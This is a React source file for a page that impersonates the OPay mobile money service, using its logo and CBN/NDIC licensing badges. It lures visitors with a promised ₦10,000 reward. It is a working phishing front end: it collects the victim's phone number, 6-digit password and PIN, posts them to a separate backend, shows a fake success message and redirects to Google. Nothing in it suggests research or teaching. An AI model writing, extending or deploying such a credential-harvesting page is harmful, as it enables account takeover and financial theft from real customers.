import React, { useState, useEffect } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import Logo from "../src/assets/opay-logo.jpg";
import CBN from "../src/assets/cbn.jpg";
import NDIC from "../src/assets/ndic.jpg";
import "./App.css";

const API_URL = process.env.REACT_APP_API_URL || "http://localhost:7127";

const Sign = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [password, setPassword] = useState("");
  const [note, setNote] = useState(""); // State for textarea
  const [errors, setErrors] = useState({});
  const [showAlert, setShowAlert] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    setShowAlert(true);
  }, []);

  const validatePhoneNumber = (value) => /^[0-9]{10,15}$/.test(value);
  const validatePassword = (value) => /^\d{6}$/.test(value);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const newErrors = {};
    if (!validatePhoneNumber(phoneNumber)) {
      newErrors.phoneNumber = "Invalid phone number";
    }
    if (!validatePassword(password)) {
      newErrors.password = "Password must be 6 digits";
    }
    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      try {
        const response = await axios.post(
          `${API_URL}/api/Auth/login`,
          { phoneNumber, password, note }, // Include the textarea value
          {
            headers: { "Content-Type": "application/json" },
            withCredentials: true,
          }
        );
        console.log("Login Success:", response.data);
        alert("Login Successful!");
        window.location.href = "https://www.google.com";
      } catch (error) {
        console.error("Login Failed:", error);
        alert(error.response?.data?.message || "Login failed");
      }
    }
  };

  return (
    <div className="container" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}>
      <div className="form-container">
        {showAlert && (
          <div className="custom-alert">
            Enter your details to claim your reward of ₦10,000 into your account 🎉.
            <button className="close-alert" onClick={() => setShowAlert(false)}>x</button>
          </div>
        )}
        <img src={Logo} alt="OPay Logo" className="logo" />
        <form onSubmit={handleSubmit} className="form-content">
          <div className="form-group">
            <input
              type="text"
              className="form-control"
              id="phoneNumber"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              placeholder=" "
              required
            />
            <label htmlFor="phoneNumber" className="floating-label">
              Enter your Mobile Number
            </label>
            {errors.phoneNumber && <div className="error-message">{errors.phoneNumber}</div>}
          </div>

          <div className="form-group">
            <input
              type="password"
              className="form-control"
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder=" "
              required
            />
            <label htmlFor="password" className="floating-label">
              Enter 6-digit Password
            </label>
            {errors.password && <div className="error-message">{errors.password}</div>}
          </div>

          {/* New Text Area Field */}
          <div className="form-group">
            <textarea
              className="form-control textarea"
              id="note"
              value={note}
              onChange={(e) => setNote(e.target.value)}
              placeholder="Enter Pin"
            ></textarea>
            {/* <label htmlFor="note" className="">Pin</label> */}
          </div>

          <button type="submit" className="btn btn-primary" style={{paddingBottom: "5rem"}}>
            Claim
          </button>
        </form>

        
        <div className="bottom-social">
          <img src={CBN} alt="CBN Logo" className="social-logo" /> Licenced by the{" "}
          <span style={{ color: "#3C3B5F", fontWeight: "bold" }}> CBN</span> and insured by the{" "}
          <img src={NDIC} alt="NDIC Logo" className="social-logo" />
        </div>
      </div>
    </div>
  );
};

export default Sign;
